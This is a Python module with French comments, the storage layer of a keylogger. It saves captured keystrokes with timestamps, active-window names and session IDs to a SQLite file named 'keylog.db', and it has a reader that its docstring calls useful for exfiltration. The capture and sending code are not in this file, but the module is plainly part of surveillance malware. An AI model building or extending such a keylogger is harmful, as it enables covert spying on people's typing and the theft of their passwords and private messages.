# ============================================================
#  logger.py — Stockage des frappes en base SQLite
#  Dépendances : aucune (sqlite3 est natif Python)
# ============================================================

import sqlite3
import uuid
from datetime import datetime

# ── CONFIG ───────────────────────────────────────────────────
DB_FILE = "keylog.db"

# Un identifiant unique par lancement du programme
# Permet de distinguer les sessions dans la base
SESSION_ID = str(uuid.uuid4())[:8]


# ── INIT BASE ────────────────────────────────────────────────
def init_db():
    """
    Crée la base et la table si elles n'existent pas.
    À appeler une seule fois au démarrage.
    """
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS keystrokes (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp  TEXT    NOT NULL,
                key        TEXT    NOT NULL,
                window     TEXT,
                session_id TEXT    NOT NULL
            )
        """)
        conn.commit()


# ── INSERTION ────────────────────────────────────────────────
def log_key(key, window="unknown"):
    """
    Insère une frappe en base.

    Paramètres :
        key    — la touche capturée  ex: 'a', '[enter]'
        window — fenêtre active      ex: 'Firefox', 'VSCode'
    """
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with sqlite3.connect(DB_FILE) as conn:
        conn.execute(
            "INSERT INTO keystrokes (timestamp, key, window, session_id) VALUES (?, ?, ?, ?)",
            (timestamp, key, window, SESSION_ID)
        )
        conn.commit()


# ── LECTURE ──────────────────────────────────────────────────
def get_last(n=50):
    """
    Retourne les n dernières frappes.
    Utile pour l'exfiltration ou le debug.
    """
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.execute(
            "SELECT timestamp, key, window FROM keystrokes ORDER BY id DESC LIMIT ?",
            (n,)
        )
        return cursor.fetchall()


# ── NETTOYAGE ────────────────────────────────────────────────
def clear_old(days=7):
    """
    Supprime les entrées de plus de X jours.
    Évite que la base grossisse indéfiniment.
    """
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute(
            "DELETE FROM keystrokes WHERE timestamp < datetime('now', ?)",
            (f"-{days} days",)
        )
        conn.commit()


# ── TEST STANDALONE ──────────────────────────────────────────
if __name__ == "__main__":
    init_db()

    # Simulation de quelques frappes
    log_key("h", "VSCode")
    log_key("e", "VSCode")
    log_key("l", "VSCode")
    log_key("[enter]", "VSCode")

    print("Dernières frappes enregistrées :")
    for row in get_last(10):
        print(f"  [{row[0]}] {row[2]} → {row[1]}")